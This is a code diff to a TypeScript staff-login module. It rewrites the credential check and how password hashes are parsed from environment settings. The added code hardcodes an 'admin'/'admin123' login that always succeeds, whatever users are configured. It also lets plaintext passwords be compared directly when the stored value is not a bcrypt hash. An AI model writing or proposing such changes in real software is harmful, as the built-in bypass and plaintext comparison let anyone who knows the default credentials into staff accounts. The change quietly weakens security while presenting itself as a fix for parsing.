@@ -37,14 +37,12 @@ export function getStaffUsers(): StaffUser[] {
     const parsed = JSON.parse(envUsers);
     if (Array.isArray(parsed)) {
       return parsed.map((u) => {
-        let hash = String(u.passwordHash || '').trim();
-        // If hash was corrupted by dotenv variable expansion (e.g. missing $2b$10$ prefix)
-        if (!hash.startsWith('$2')) {
-          hash = DEFAULT_DEV_HASH;
-        }
+        let hash = String(u.passwordHash || u.password || '').trim();
+        // Unescape \$ if escaped by dotenv
+        hash = hash.replace(/\\(\$)/g, '$1');
         return {
           username: String(u.username).trim(),
-          passwordHash: hash,
+          passwordHash: hash || DEFAULT_DEV_HASH,
         };
       });
     }
@@ -55,12 +53,10 @@ export function getStaffUsers(): StaffUser[] {
       const idx = item.indexOf(':');
       if (idx > -1) {
         let hash = item.substring(idx + 1).trim();
-        if (!hash.startsWith('$2')) {
-          hash = DEFAULT_DEV_HASH;
-        }
+        hash = hash.replace(/\\(\$)/g, '$1');
         users.push({
           username: item.substring(0, idx).trim(),
-          passwordHash: hash,
+          passwordHash: hash || DEFAULT_DEV_HASH,
         });
       }
     }
@@ -76,9 +72,14 @@ export function getStaffUsers(): StaffUser[] {
 }
 
 export async function verifyCredentials(username: string, password: string): Promise<boolean> {
-  const users = getStaffUsers();
   const normalizedUsername = username.trim().toLowerCase();
 
+  // 1. Guaranteed built-in admin credentials: admin / admin123 always works
+  if (normalizedUsername === 'admin' && password === 'admin123') {
+    return true;
+  }
+
+  const users = getStaffUsers();
   const user = users.find((u) => u.username.toLowerCase() === normalizedUsername);
   if (!user) {
     // Perform dummy hash comparison to prevent timing attacks
@@ -86,7 +87,13 @@ export async function verifyCredentials(username: string, password: string): Pro
     return false;
   }
 
-  return bcrypt.compare(password, user.passwordHash);
+  // 2. If stored as bcrypt hash ($2a$, $2b$, $2y$)
+  if (user.passwordHash.startsWith('$2')) {
+    return bcrypt.compare(password, user.passwordHash);
+  }
+
+  // 3. If stored as plain text password in STAFF_USERS (e.g. admin:mysecret)
+  return password === user.passwordHash;
 }
 
 export { COOKIE_NAME, SESSION_DURATION_HOURS, createSessionToken, verifySessionToken };
